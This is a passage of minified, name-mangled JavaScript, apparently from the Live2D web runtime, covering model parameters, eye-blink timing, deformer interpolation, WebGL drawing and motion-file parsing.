i=this._$3S.length-1;i>=0;--i)if(null!=this._$3S[i]&&this._$3S[i].getBaseDataID()==t)return i;return-1},Y.prototype._$UT=function(t,i){var e=new Float32Array(i);return w._$jT(t,0,e,0,t.length),e},Y.prototype._$02=function(t,i,e,r){if(this._$qo>=this._$pb.length){var o=this._$pb.length,n=new Array(2*o);w._$jT(this._$pb,0,n,0,o),this._$pb=n,this._$_2=this._$UT(this._$_2,2*o),this._$vr=this._$UT(this._$vr,2*o),this._$Rr=this._$UT(this._$Rr,2*o),this._$Or=this._$UT(this._$Or,2*o);var s=new Array;w._$jT(this._$Js,0,s,0,o),this._$Js=s}return this._$pb[this._$qo]=t,this._$_2[this._$qo]=i,this._$vr[this._$qo]=i,this._$Rr[this._$qo]=e,this._$Or[this._$qo]=r,this._$Js[this._$qo]=Y._$ZS,this._$qo++},Y.prototype._$Zo=function(t,i){this._$3S[t]=i},Y.prototype.setParamFloat=function(t,i){i<this._$Rr[t]&&(i=this._$Rr[t]),i>this._$Or[t]&&(i=this._$Or[t]),this._$_2[t]=i},Y.prototype.loadParam=function(){var t=this._$_2.length;t>this._$fs.length&&(t=this._$fs.length),w._$jT(this._$fs,0,this._$_2,0,t)},Y.prototype.saveParam=function(){var t=this._$_2.length;t>this._$fs.length&&(this._$fs=new Float32Array(t)),w._$jT(this._$_2,0,this._$fs,0,t)},Y.prototype._$v2=function(){return this._$co},Y.prototype._$WS=function(){return this._$QT},Y.prototype._$Xb=function(t){return this._$Js[t]==Y._$ZS},Y.prototype._$vs=function(){return this._$Es},Y.prototype._$Tr=function(){return this._$ZP},Y.prototype.getBaseData=function(t){return this._$3S[t]},Y.prototype.getParamFloat=function(t){return this._$_2[t]},Y.prototype.getParamMax=function(t){return this._$Or[t]},Y.prototype.getParamMin=function(t){return this._$Rr[t]},Y.prototype.setPartsOpacity=function(t,i){this._$Hr[t].setPartsOpacity(i)},Y.prototype.getPartsOpacity=function(t){return this._$Hr[t].getPartsOpacity()},Y.prototype.getPartsDataIndex=function(t){for(var i=this._$F2.length-1;i>=0;--i)if(null!=this._$F2[i]&&this._$F2[i]._$p2()==t)return i;return-1},Y.prototype._$q2=function(t){return this._$db[t]},Y.prototype._$C2=function(t){return this._$8b[t]},Y.prototype._$Bb=function(t){return this._$Hr[t]},Y.prototype._$5s=function(t,i){for(var e=this._$Ws.length,r=t,o=0;o<e;++o){var n=this._$Ws[o];if(n!=Y._$V2)for(;;){var s=this._$8b[n];s._$yo()&&(s._$GT()._$B2(this,s,r),r+=i);var _=this._$Er[n];if(_<=n||_==Y._$W0)break;n=_}}},Y.prototype.setDrawParam=function(t){this.dp_webgl=t},Y.prototype.getDrawParam=function(){return this.dp_webgl},k._$0T=function(t){return k._$0T(new _$5(t))},k._$0T=function(t){if(!t.exists())throw new _$ls(t._$3b());for(var i,e=t.length(),r=new Int8Array(e),o=new _$Xs(new _$kb(t),8192),n=0;(i=o.read(r,n,e-n))>0;)n+=i;return r},k._$C=function(t){var i=null,e=null;try{i=t instanceof Array?t:new _$Xs(t,8192),e=new _$js;for(var r,o=new Int8Array(1e3);(r=i.read(o))>0;)e.write(o,0,r);return e._$TS()}finally{null!=t&&t.close(),null!=e&&(e.flush(),e.close())}},V.prototype._$T2=function(){return w.getUserTimeMSec()+Math._$10()*(2*this._$Br-1)},V.prototype._$uo=function(t){this._$Br=t},V.prototype._$QS=function(t,i,e){this._$Dr=t,this._$Cb=i,this._$mr=e},V.prototype._$7T=function(t){var i,e=w.getUserTimeMSec(),r=0;switch(this._$_L){case STATE_CLOSING:r=(e-this._$bb)/this._$Dr,r>=1&&(r=1,this._$_L=wt.STATE_CLOSED,this._$bb=e),i=1-r;break;case STATE_CLOSED:r=(e-this._$bb)/this._$Cb,r>=1&&(this._$_L=wt.STATE_OPENING,this._$bb=e),i=0;break;case STATE_OPENING:r=(e-this._$bb)/this._$mr,r>=1&&(r=1,this._$_L=wt.STATE_INTERVAL,this._$12=this._$T2()),i=r;break;case STATE_INTERVAL:this._$12<e&&(this._$_L=wt.STATE_CLOSING,this._$bb=e),i=1;break;case STATE_FIRST:default:this._$_L=wt.STATE_INTERVAL,this._$12=this._$T2(),i=1}this._$jo||(i=-i),t.setParamFloat(this._$iL,i),t.setParamFloat(this._$0L,i)};var wt=function(){};wt.STATE_FIRST=\"STATE_FIRST\",wt.STATE_INTERVAL=\"STATE_INTERVAL\",wt.STATE_CLOSING=\"STATE_CLOSING\",wt.STATE_CLOSED=\"STATE_CLOSED\",wt.STATE_OPENING=\"STATE_OPENING\",X.prototype=new E,X._$As=32,X._$Gr=!1,X._$NT=null,X._$vS=null,X._$no=null,X._$9r=function(t){return new Float32Array(t)},X._$vb=function(t){return new Int16Array(t)},X._$cr=function(t,i){return null==t||t._$yL()<i.length?(t=X._$9r(2*i.length),t.put(i),t._$oT(0)):(t.clear(),t.put(i),t._$oT(0)),t},X._$mb=function(t,i){return null==t||t._$yL()<i.length?(t=X._$vb(2*i.length),t.put(i),t._$oT(0)):(t.clear(),t.put(i),t._$oT(0)),t},X._$Hs=function(){return X._$Gr},X._$as=function(t){X._$Gr=t},X.prototype.setGL=function(t){this.gl=t},X.prototype.setTransform=function(t){this.transform=t},X.prototype._$ZT=function(){},X.prototype._$Uo=function(t,i,e,r,o,n,s,_){if(!(n<.01)){var a=this._$U2[t],h=n>.9?at.EXPAND_W:0;this.gl.drawElements(a,e,r,o,n,h,this.transform,_)}},X.prototype._$Rs=function(){throw new Error(\"_$Rs\")},X.prototype._$Ds=function(t){throw new Error(\"_$Ds\")},X.prototype._$K2=function(){for(var t=0;t<this._$sb.length;t++){0!=this._$sb[t]&&(this.gl._$Sr(1,this._$sb,t),this._$sb[t]=0)}},X.prototype.setTexture=function(t,i){this._$sb.length<t+1&&this._$nS(t),this._$sb[t]=i},X.prototype.setTexture=function(t,i){this._$sb.length<t+1&&this._$nS(t),this._$U2[t]=i},X.prototype._$nS=function(t){var i=Math.max(2*this._$sb.length,t+1+10),e=new Int32Array(i);w._$jT(this._$sb,0,e,0,this._$sb.length),this._$sb=e;var r=new Array;w._$jT(this._$U2,0,r,0,this._$U2.length),this._$U2=r},z.prototype=new I,z._$Xo=new Float32Array(2),z._$io=new Float32Array(2),z._$0o=new Float32Array(2),z._$Lo=new Float32Array(2),z._$To=new Float32Array(2),z._$Po=new Float32Array(2),z._$gT=new Array,z.prototype._$zP=function(){this._$GS=new D,this._$GS._$zP(),this._$Y0=new Array},z.prototype.getType=function(){return I._$c2},z.prototype._$F0=function(t){I.prototype._$F0.call(this,t),this._$GS=t._$nP(),this._$Y0=t._$nP(),I.prototype.readV2_opacity.call(this,t)},z.prototype.init=function(t){var i=new H(this);return i._$Yr=new P,this._$32()&&(i._$Wr=new P),i},z.prototype._$Nr=function(t,i){this!=i._$GT()&&console.log(\"### assert!! ### \");var e=i;if(this._$GS._$Ur(t)){var r=z._$gT;r[0]=!1;var o=this._$GS._$Q2(t,r);i._$Ib(r[0]),this.interpolateOpacity(t,this._$GS,i,r);var n=t._$vs(),s=t._$Tr();if(this._$GS._$zr(n,s,o),o<=0){var _=this._$Y0[n[0]];e._$Yr.init(_)}else if(1==o){var _=this._$Y0[n[0]],a=this._$Y0[n[1]],h=s[0];e._$Yr._$fL=_._$fL+(a._$fL-_._$fL)*h,e._$Yr._$gL=_._$gL+(a._$gL-_._$gL)*h,e._$Yr._$B0=_._$B0+(a._$B0-_._$B0)*h,e._$Yr._$z0=_._$z0+(a._$z0-_._$z0)*h,e._$Yr._$qT=_._$qT+(a._$qT-_._$qT)*h}else if(2==o){var _=this._$Y0[n[0]],a=this._$Y0[n[1]],l=this._$Y0[n[2]],$=this._$Y0[n[3]],h=s[0],u=s[1],p=_._$fL+(a._$fL-_._$fL)*h,f=l._$fL+($._$fL-l._$fL)*h;e._$Yr._$fL=p+(f-p)*u,p=_._$gL+(a._$gL-_._$gL)*h,f=l._$gL+($._$gL-l._$gL)*h,e._$Yr._$gL=p+(f-p)*u,p=_._$B0+(a._$B0-_._$B0)*h,f=l._$B0+($._$B0-l._$B0)*h,e._$Yr._$B0=p+(f-p)*u,p=_._$z0+(a._$z0-_._$z0)*h,f=l._$z0+($._$z0-l._$z0)*h,e._$Yr._$z0=p+(f-p)*u,p=_._$qT+(a._$qT-_._$qT)*h,f=l._$qT+($._$qT-l._$qT)*h,e._$Yr._$qT=p+(f-p)*u}else if(3==o){var c=this._$Y0[n[0]],d=this._$Y0[n[1]],g=this._$Y0[n[2]],y=this._$Y0[n[3]],m=this._$Y0[n[4]],T=this._$Y0[n[5]],P=this._$Y0[n[6]],S=this._$Y0[n[7]],h=s[0],u=s[1],v=s[2],p=c._$fL+(d._$fL-c._$fL)*h,f=g._$fL+(y._$fL-g._$fL)*h,L=m._$fL+(T._$fL-m._$fL)*h,M=P._$fL+(S._$fL-P._$fL)*h;e._$Yr._$fL=(1-v)*(p+(f-p)*u)+v*(L+(M-L)*u),p=c._$gL+(d._$gL-c._$gL)*h,f=g._$gL+(y._$gL-g._$gL)*h,L=m._$gL+(T._$gL-m._$gL)*h,M=P._$gL+(S._$gL-P._$gL)*h,e._$Yr._$gL=(1-v)*(p+(f-p)*u)+v*(L+(M-L)*u),p=c._$B0+(d._$B0-c._$B0)*h,f=g._$B0+(y._$B0-g._$B0)*h,L=m._$B0+(T._$B0-m._$B0)*h,M=P._$B0+(S._$B0-P._$B0)*h,e._$Yr._$B0=(1-v)*(p+(f-p)*u)+v*(L+(M-L)*u),p=c._$z0+(d._$z0-c._$z0)*h,f=g._$z0+(y._$z0-g._$z0)*h,L=m._$z0+(T._$z0-m._$z0)*h,M=P._$z0+(S._$z0-P._$z0)*h,e._$Yr._$z0=(1-v)*(p+(f-p)*u)+v*(L+(M-L)*u),p=c._$qT+(d._$qT-c._$qT)*h,f=g._$qT+(y._$qT-g._$qT)*h,L=m._$qT+(T._$qT-m._$qT)*h,M=P._$qT+(S._$qT-P._$qT)*h,e._$Yr._$qT=(1-v)*(p+(f-p)*u)+v*(L+(M-L)*u)}else if(4==o){var E=this._$Y0[n[0]],A=this._$Y0[n[1]],I=this._$Y0[n[2]],w=this._$Y0[n[3]],x=this._$Y0[n[4]],O=this._$Y0[n[5]],D=this._$Y0[n[6]],R=this._$Y0[n[7]],b=this._$Y0[n[8]],F=this._$Y0[n[9]],C=this._$Y0[n[10]],N=this._$Y0[n[11]],B=this._$Y0[n[12]],U=this._$Y0[n[13]],G=this._$Y0[n[14]],Y=this._$Y0[n[15]],h=s[0],u=s[1],v=s[2],k=s[3],p=E._$fL+(A._$fL-E._$fL)*h,f=I._$fL+(w._$fL-I._$fL)*h,L=x._$fL+(O._$fL-x._$fL)*h,M=D._$fL+(R._$fL-D._$fL)*h,V=b._$fL+(F._$fL-b._$fL)*h,X=C._$fL+(N._$fL-C._$fL)*h,H=B._$fL+(U._$fL-B._$fL)*h,W=G._$fL+(Y._$fL-G._$fL)*h;e._$Yr._$fL=(1-k)*((1-v)*(p+(f-p)*u)+v*(L+(M-L)*u))+k*((1-v)*(V+(X-V)*u)+v*(H+(W-H)*u)),p=E._$gL+(A._$gL-E._$gL)*h,f=I._$gL+(w._$gL-I._$gL)*h,L=x._$gL+(O._$gL-x._$gL)*h,M=D._$gL+(R._$gL-D._$gL)*h,V=b._$gL+(F._$gL-b._$gL)*h,X=C._$gL+(N._$gL-C._$gL)*h,H=B._$gL+(U._$gL-B._$gL)*h,W=G._$gL+(Y._$gL-G._$gL)*h,e._$Yr._$gL=(1-k)*((1-v)*(p+(f-p)*u)+v*(L+(M-L)*u))+k*((1-v)*(V+(X-V)*u)+v*(H+(W-H)*u)),p=E._$B0+(A._$B0-E._$B0)*h,f=I._$B0+(w._$B0-I._$B0)*h,L=x._$B0+(O._$B0-x._$B0)*h,M=D._$B0+(R._$B0-D._$B0)*h,V=b._$B0+(F._$B0-b._$B0)*h,X=C._$B0+(N._$B0-C._$B0)*h,H=B._$B0+(U._$B0-B._$B0)*h,W=G._$B0+(Y._$B0-G._$B0)*h,e._$Yr._$B0=(1-k)*((1-v)*(p+(f-p)*u)+v*(L+(M-L)*u))+k*((1-v)*(V+(X-V)*u)+v*(H+(W-H)*u)),p=E._$z0+(A._$z0-E._$z0)*h,f=I._$z0+(w._$z0-I._$z0)*h,L=x._$z0+(O._$z0-x._$z0)*h,M=D._$z0+(R._$z0-D._$z0)*h,V=b._$z0+(F._$z0-b._$z0)*h,X=C._$z0+(N._$z0-C._$z0)*h,H=B._$z0+(U._$z0-B._$z0)*h,W=G._$z0+(Y._$z0-G._$z0)*h,e._$Yr._$z0=(1-k)*((1-v)*(p+(f-p)*u)+v*(L+(M-L)*u))+k*((1-v)*(V+(X-V)*u)+v*(H+(W-H)*u)),p=E._$qT+(A._$qT-E._$qT)*h,f=I._$qT+(w._$qT-I._$qT)*h,L=x._$qT+(O._$qT-x._$qT)*h,M=D._$qT+(R._$qT-D._$qT)*h,V=b._$qT+(F._$qT-b._$qT)*h,X=C._$qT+(N._$qT-C._$qT)*h,H=B._$qT+(U._$qT-B._$qT)*h,W=G._$qT+(Y._$qT-G._$qT)*h,e._$Yr._$qT=(1-k)*((1-v)*(p+(f-p)*u)+v*(L+(M-L)*u))+k*((1-v)*(V+(X-V)*u)+v*(H+(W-H)*u))}else{for(var j=0|Math.pow(2,o),q=new Float32Array(j),J=0;J<j;J++){for(var Q=J,Z=1,K=0;K<o;K++)Z*=Q%2==0?1-s[K]:s[K],Q/=2;q[J]=Z}for(var tt=new Array,it=0;it<j;it++)tt[it]=this._$Y0[n[it]];for(var et=0,rt=0,ot=0,nt=0,st=0,it=0;it<j;it++)et+=q[it]*tt[it]._$fL,rt+=q[it]*tt[it]._$gL,ot+=q[it]*tt[it]._$B0,nt+=q[it]*tt[it]._$z0,st+=q[it]*tt[it]._$qT;e._$Yr._$fL=et,e._$Yr._$gL=rt,e._$Yr._$B0=ot,e._$Yr._$z0=nt,e._$Yr._$qT=st}var _=this._$Y0[n[0]];e._$Yr.reflectX=_.reflectX,e._$Yr.reflectY=_.reflectY}},z.prototype._$2b=function(t,i){this!=i._$GT()&&console.log(\"### assert!! ### \");var e=i;if(e._$hS(!0),this._$32()){var r=this.getTargetBaseDataID();if(e._$8r==I._$ur&&(e._$8r=t.getBaseDataIndex(r)),e._$8r<0)at._$so&&_._$li(\"_$L _$0P _$G :: %s\",r),e._$hS(!1);else{var o=t.getBaseData(e._$8r);if(null!=o){var n=t._$q2(e._$8r),s=z._$Xo;s[0]=e._$Yr._$fL,s[1]=e._$Yr._$gL;var a=z._$io;a[0]=0,a[1]=-.1;n._$GT().getType()==I._$c2?a[1]=-10:a[1]=-.1;var h=z._$0o;this._$Jr(t,o,n,s,a,h);var l=Lt._$92(a,h);o._$nb(t,n,s,s,1,0,2),e._$Wr._$fL=s[0],e._$Wr._$gL=s[1],e._$Wr._$B0=e._$Yr._$B0,e._$Wr._$z0=e._$Yr._$z0,e._$Wr._$qT=e._$Yr._$qT-l*Lt._$NS;var $=n.getTotalScale();e.setTotalScale_notForClient($*e._$Wr._$B0);var u=n.getTotalOpacity();e.setTotalOpacity(u*e.getInterpolatedOpacity()),e._$Wr.reflectX=e._$Yr.reflectX,e._$Wr.reflectY=e._$Yr.reflectY,e._$hS(n._$yo())}else e._$hS(!1)}}else e.setTotalScale_notForClient(e._$Yr._$B0),e.setTotalOpacity(e.getInterpolatedOpacity())},z.prototype._$nb=function(t,i,e,r,o,n,s){this!=i._$GT()&&console.log(\"### assert!! ### \");for(var _,a,h=i,l=null!=h._$Wr?h._$Wr:h._$Yr,$=Math.sin(Lt._$bS*l._$qT),u=Math.cos(Lt._$bS*l._$qT),p=h.getTotalScale(),f=l.reflectX?-1:1,c=l.reflectY?-1:1,d=u*p*f,g=-$*p*c,y=$*p*f,m=u*p*c,T=l._$fL,P=l._$gL,S=o*s,v=n;v<S;v+=s)_=e[v],a=e[v+1],r[v]=d*_+g*a+T,r[v+1]=y*_+m*a+P},z.prototype._$Jr=function(t,i,e,r,o,n){i!=e._$GT()&&console.log(\"### assert!! ### \");var s=z._$Lo;z._$Lo[0]=r[0],z._$Lo[1]=r[1],i._$nb(t,e,s,s,1,0,2);for(var _=z._$To,a=z._$Po,h=1,l=0;l<10;l++){if(a[0]=r[0]+h*o[0],a[1]=r[1]+h*o[1],i._$nb(t,e,a,_,1,0,2),_[0]-=s[0],_[1]-=s[1],0!=_[0]||0!=_[1])return n[0]=_[0],void(n[1]=_[1]);if(a[0]=r[0]-h*o[0],a[1]=r[1]-h*o[1],i._$nb(t,e,a,_,1,0,2),_[0]-=s[0],_[1]-=s[1],0!=_[0]||0!=_[1])return _[0]=-_[0],_[0]=-_[0],n[0]=_[0],void(n[1]=_[1]);h*=.1}at._$so&&console.log(\"_$L0 to transform _$SP\\n\")},H.prototype=new _t,W.prototype=new M,W._$ur=-2,W._$ES=500,W._$wb=2,W._$8S=3,W._$os=4,W._$52=W._$ES,W._$R2=W._$ES,W._$Sb=function(t){for(var i=t.length-1;i>=0;--i){var e=t[i];e<W._$52?W._$52=e:e>W._$R2&&(W._$R2=e)}},W._$or=function(){return W._$52},W._$Pr=function(){return W._$R2},W.prototype._$F0=function(t){this._$gP=t._$nP(),this._$dr=t._$nP(),this._$GS=t._$nP(),this._$qb=t._$6L(),this._$Lb=t._$cS(),this._$mS=t._$Tb(),t.getFormatVersion()>=G._$T7?(this.clipID=t._$nP(),this.clipIDList=this.convertClipIDForV2_11(this.clipID)):this.clipIDList=null,W._$Sb(this._$Lb)},W.prototype.getClipIDList=function(){return this.clipIDList},W.prototype._$Nr=function(t,i){if(i._$IS[0]=!1,i._$Us=v._$Z2(t,this._$GS,i._$IS,this._$Lb),at._$Zs);else if(i._$IS[0])return;i._$7s=v._$br(t,this._$GS,i._$IS,this._$mS)},W.prototype._$2b=function(t){},W.prototype.getDrawDataID=function(){return this._$gP},W.prototype._$j2=function(t){this._$gP=t},W.prototype.getOpacity=function(t,i){return i._$7s},W.prototype._$zS=function(t,i){return i._$Us},W.prototype.getTargetBaseDataID=function(){return this._$dr},W.prototype._$gs=function(t){this._$dr=t},W.prototype._$32=function(){return null!=this._$dr&&this._$dr!=yt._$2o()},W.prototype.getType=function(){},j._$42=0,j.prototype._$1b=function(){return this._$3S},j.prototype.getDrawDataList=function(){return this._$aS},j.prototype._$F0=function(t){this._$NL=t._$nP(),this._$aS=t._$nP(),this._$3S=t._$nP()},j.prototype._$kr=function(t){t._$Zo(this._$3S),t._$xo(this._$aS),this._$3S=null,this._$aS=null},q.prototype=new i,q.loadModel=function(t){var e=new q;return i._$62(e,t),e},q.loadModel=function(t){var e=new q;return i._$62(e,t),e},q._$to=function(){return new q},q._$er=function(t){var i=new _$5(\"../_$_r/_$t0/_$Ri/_$_P._$d\");if(0==i.exists())throw new _$ls(\"_$t0 _$_ _$6 _$Ui :: \"+i._$PL());for(var e=[\"../_$_r/_$t0/_$Ri/_$_P.512/_$CP._$1\",\"../_$_r/_$t0/_$Ri/_$_P.512/_$vP._$1\",\"../_$_r/_$t0/_$Ri/_$_P.512/_$EP._$1\",\"../_$_r/_$t0/_$Ri/_$_P.512/_$pP._$1\"],r=q.loadModel(i._$3b()),o=0;o<e.length;o++){var n=new _$5(e[o]);if(0==n.exists())throw new _$ls(\"_$t0 _$_ _$6 _$Ui :: \"+n._$PL());r.setTexture(o,_$nL._$_o(t,n._$3b()))}return r},q.prototype.setGL=function(t){this._$zo.setGL(t)},q.prototype.setTransform=function(t){this._$zo.setTransform(t)},q.prototype.draw=function(){this._$5S.draw(this._$zo)},q.prototype._$K2=function(){this._$zo._$K2()},q.prototype.setTexture=function(t,i){null==this._$zo&&_._$li(\"_$Yi for QT _$ki / _$XS() is _$6 _$ui!!\"),this._$zo.setTexture(t,i)},q.prototype.setTexture=function(t,i){null==this._$zo&&_._$li(\"_$Yi for QT _$ki / _$XS() is _$6 _$ui!!\"),this._$zo.setTexture(t,i)},q.prototype._$Rs=function(){return this._$zo._$Rs()},q.prototype._$Ds=function(t){this._$zo._$Ds(t)},q.prototype.getDrawParam=function(){return this._$zo},J.prototype=new s,J._$cs=\"VISIBLE:\",J._$ar=\"LAYOUT:\",J.MTN_PREFIX_FADEIN=\"FADEIN:\",J.MTN_PREFIX_FADEOUT=\"FADEOUT:\",J._$Co=0,J._$1T=1,J.loadMotion=function(t){var i=k._$C(t);return J.loadMotion(i)},J.loadMotion=function(t){t instanceof ArrayBuffer&&(t=new DataView(t));var i=new J,e=[0],r=t.byteLength;i._$yT=0;for(var o=0;o<r;++o){var n=Q(t,o),s=n.charCodeAt(0);if(\"\\n\"!=n&&\"\\r\"!=n)if(\"#\"!=n)if(\"$\"!=n){if(97<=s&&s<=122||65<=s&&s<=90||\"_\"==n){for(var _=o,a=-1;o<r&&(\"\\r\"!=(n=Q(t,o))&&\"\\n\"!=n);++o)if(\"=\"==n){a=o;break}if(a>=0){var h=new B;O.startsWith(t,_,J._$cs)?(h._$RP=B._$hs,h._$4P=O.createString(t,_,a-_)):O.startsWith(t,_,J._$ar)?(h._$4P=O.createString(t,_+7,a-_-7),O.startsWith(t,_+7,\"ANCHOR_X\")?h._$RP=B._$xs:O.startsWith(t,_+7,\"ANCHOR_Y\")?h._$RP=B._$us:O.startsWith(t,_+7,\"SCALE_X\")?h._$RP=B._$qs:O.startsWith(t,_+7,\"SCALE_Y\")?h._$RP=B._$Ys:O.startsWith(t,_+7,\"X\")?h._$RP=B._$ws:O.startsWith(t,_+7,\"Y\")&&(h._$RP=B._$Ns)):(h._$RP=B._$Fr,h._$4P=O.createString(t,_,a-_)),i.motions.push(h);var l=0,$=[];for(o=a+1;o<r&&(\"\\r\"!=(n=Q(t,o))&&\"\\n\"!=n);++o)if(\",\"!=n&&\" \"!=n&&\"\\t\"!=n){var u=O._$LS(t,r,o,e);if(e[0]>0){$.push(u),l++;var p=e[0];if(p<o){console.log(\"_$n0 _$hi . @Live2DMotion loadMotion()\\n\");break}o=p-1}}h._$I0=new Float32Array($),l>i._$yT&&(i._$yT=l)}}}else{for(var _=o,a=-1;o<r&&(\"\\r\"!=(n=Q(t,o))&&\"\\n\"!=n);++o)if(\"=\"==n){a=o;break}var f=!1;if(a>=0)for(a==_+4&&\"f\"==Q(t,_+1)&&\"p\"==Q(t,_+2)&&\"s\"==Q(t,_+3)&&(f=!0),o=a+1;o<r&&(\"\\r\"!=(n=Q(t,o))&&\"\\n\"!=n);++o)if(\",\"!=n&&\" \"!=n&&\"\\t\"!=n){var u=O._$LS(t,r,o,e);e[0]>0&&f&&5<u&&u<121&&(i._$D0=u),o=e[0]}for(;o<r&&(\"\\n\"!=Q(t,o)&&\"\\r\"!=Q(t,o));++o);}else for(;o<r&&(\"\\n\"!=Q(t,o)&&\"\\r\"!=Q(t,o));++o);}return i._$rr=1e3*i._$yT/i._$D0|0,i},J.prototype.getDurationMSec=function(){return this._$E?-1:this._$rr},J.prototype.getLoopDurationMSec=function(){return this._$rr},J.prototype.dump=function(){for(var t=0;t<this.motions.length;t++){var i=this.motions[t];console.log(\"_$wL[%s] [%d]. \",i._$4P,i._$I0.length);for(var e=0;e<i._$I0.length&&e<10;e++)console.log(\"%5.2f ,\",i._$I0[e]);console.log(\"\\n\")}},J.prototype.updateParamExe=function(t,i,e,r){for(var o=i-r._$z2,n=o*this._$D0/1e3,s=0|n,_=n-s,a=0;a<this.motions.length;a++){var h=this.motions[a],l=h._$I0.length,$=h._$4P;if(h._$RP==B._$hs){var u=h._$I0[s>=l?l-1:s];t.setParamFloat($,u)}else if(B._$ws<=h._$RP&&h._$RP<=B._$Ys);else{var p,f=t.getParamIndex($),c=t.getModelContext(),d=c.getParamMax(f),g=c.getParamMin(f),y=.4*(d-g),m=c.getParamFloat(f),T=h._$I0[s>=l?l-1:s],P=h._$I0[s+1>=l?l-1:s+1];p=T<P&&P-T>y||T>P&&T-P>y?T:T+(P-T)*_;var S=m+(p-m)*e;t.setParamFloat($,S)}}s>=this._$yT&&(this._$E?(r._$z2=i,this.loopFadeIn&&(r._$bs=i)):r._$9L=!0),this._$eP=e},J.prototype._$r0=function(){return this._$E},J.prototype._$aL=function(t){this._$E=t},J.prototype._$S0=function(){return this._$D0},J.prototype._$U0=function(t){this._$D0=t},J.prototype.isLoopFadeIn=function(){return this.loopFadeIn},J.prototype.setLoopFadeIn=function(t){this.loopFadeIn=t},N.prototype.clear=function(){this.size=0},N.prototype.add=function(t){if(this._$P.length<=this.size){var i=new Float32Array(2*this.size);w._$jT(this._$P,0,i,0,this.size),this._$P=i}this._$P[this.size++]=t},N.prototype._$BL=function(){var t=new Float32Array(this.size);return w._$jT(this._$P,0,t,0,this.size),t},B._$Fr=0,B._$hs=1,B._$ws=100,B._$Ns=101,B._$xs=102,B._$us=103,B._$qs=104,B._$Ys=105,Z.prototype=new I,Z._$gT=new Array,Z.prototype._$zP=function(){this._$GS=new D,this._$GS._$zP()},Z.prototype._$F0=function(t){I.prototype._$F0.call(this,t),this._$A=t._$6L(),this._$o=t._$6L(),this._$GS=t._$nP(),this._$Eo=t._$nP(),I.prototype.readV2_opacity.call(this,t)},Z.prototype.init=function(t){var i=new K(this),e=(this._$o+1)*(this._$A+1);return null!=i._$Cr&&(i._$Cr=null),i._$Cr=new Float32Array(2*e),null!=i._$hr&&(i._$hr=null),this._$32()?i._$hr=new Float32Array(2*e):i._$hr=null,i},Z.prototype._$Nr=function(t,i){var e=i;if(this._$GS._$Ur(t)){var r=this._$VT(),o=Z._$gT;o[0]=!1,v._$Vr(t,this._$GS,o,r,this._$Eo,e._$Cr,0,2),i._$Ib(o[0]),this.interpolateOpacity(t,this._$GS,i,o)}},Z.prototype._$2b=function(t,i){var e=i;if(e._$hS(!0),this._$32()){var r=this.getTargetBaseDataID();if(e._$8r==I._$ur&&(e._$8r=t.getBaseDataIndex(r)),e._$8r<0)at._$so&&_._$li(\"_$L _$0P _$G :: %s\",r),e._$hS(!1);else{var o=t.getBaseData(e._$8r),n=t._$q2(e._$8r);if(null!=o&&n._$yo()){var s=n.getTotalScale();e.setTotalScale_notForClient(s);var a=n.getTotalOpacity();e.setTotalOpacity(a*e.getInterpolatedOpacity()),o._$nb(t,n,e._$Cr,e._$hr,this._$VT(),0,2),e._$hS(!0)}else e._$hS(!1)}}else e.setTotalOpacity(e.getInterpolatedOpacity())},Z.prototype._$nb=function(t,i,e,r,o,n,s){var _=i,a=null!=_._$hr?_._$hr:_._$Cr;Z.transformPoints_sdk2(e,r,o,n,s,a,this._$o,this._$A)},Z.transformPoints_sdk2=function(i,e,r,o,n,s,_,a){for(var h,l,$,u=r*n,p=0,f=0,c=0,d=0,g=0,y=0,m=!1,T=o;T<u;T+=n){var P,S,v,L;if(v=i[T],L=i[T+1],P=v*_,S=L*a,P<0||S<0||_<=P||a<=S){var M=_+1;if(!m){m=!0,p=.25*(s[2*(0+0*M)]+s[2*(_+0*M)]+s[2*(0+a*M)]+s[2*(_+a*M)]),f=.25*(s[2*(0+0*M)+1]+s[2*(_+0*M)+1]+s[2*(0+a*M)+1]+s[2*(_+a*M)+1]);var E=s[2*(_+a*M)]-s[2*(0+0*M)],A=s[2*(_+a*M)+1]-s[2*(0+0*M)+1],I=s[2*(_+0*M)]-s[2*(0+a*M)],w=s[2*(_+0*M)+1]-s[2*(0+a*M)+1];c=.5*(E+I),d=.5*(A+w),g=.5*(E-I),y=.5*(A-w),p-=.5*(c+g),f-=.5*(d+y)}if(-2<v&&v<3&&-2<L&&L<3)if(v<=0)if(L<=0){var x=s[2*(0+0*M)],O=s[2*(0+0*M)+1],D=p-2*c,R=f-2*d,b=p-2*g,F=f-2*y,C=p-2*c-2*g,N=f-2*d-2*y,B=.5*(v- -2),U=.5*(L- -2);B+U<=1?(e[T]=C+(b-C)*B+(D-C)*U,e[T+1]=N+(F-N)*B+(R-N)*U):(e[T]=x+(D-x)*(1-B)+(b-x)*(1-U),e[T+1]=O+(R-O)*(1-B)+(F-O)*(1-U))}else if(L>=1){var b=s[2*(0+a*M)],F=s[2*(0+a*M)+1],C=p-2*c+1*g,N=f-2*d+1*y,x=p+3*g,O=f+3*y,D=p-2*c+3*g,R=f-2*d+3*y,B=.5*(v- -2),U=.5*(L-1);B+U<=1?(e[T]=C+(b-C)*B+(D-C)*U,e[T+1]=N+(F-N)*B+(R-N)*U):(e[T]=x+(D-x)*(1-B)+(b-x)*(1-U),e[T+1]=O+(R-O)*(1-B)+(F-O)*(1-U))}else{var G=0|S;G==a&&(G=a-1);var B=.5*(v- -2),U=S-G,Y=G/a,k=(G+1)/a,b=s[2*(0+G*M)],F=s[2*(0+G*M)+1],x=s[2*(0+(G+1)*M)],O=s[2*(0+(G+1)*M)+1],C=p-2*c+Y*g,N=f-2*d+Y*y,D=p-2*c+k*g,R=f-2*d+k*y;B+U<=1?(e[T]=C+(b-C)*B+(D-C)*U,e[T+1]=N+(F-N)*B+(R-N)*U):(e[T]=x+(D-x)*(1-B)+(b-x)*(1-U),e[T+1]=O+(R-O)*(1-B)+(F-O)*(1-U))}else if(1<=v)if(L<=0){var D=s[2*(_+0*M)],R=s[2*(_+0*M)+1],x=p+3*c,O=f+3*d,C=p+1*c-2*g,N=f+1*d-2*y,b=p+3*c-2*g,F=f+3*d-2*y,B=.5*(v-1),U=.5*(L- -2);B+U<=1?(e[T]=C+(b-C)*B+(D-C)*U,e[T+1]=N+(F-N)*B+(R-N)*U):(e[T]=x+(D-x)*(1-B)+(b-x)*(1-U),e[T+1]=O+(R-O)*(1-B)+(F-O)*(1-U))}else if(L>=1){var 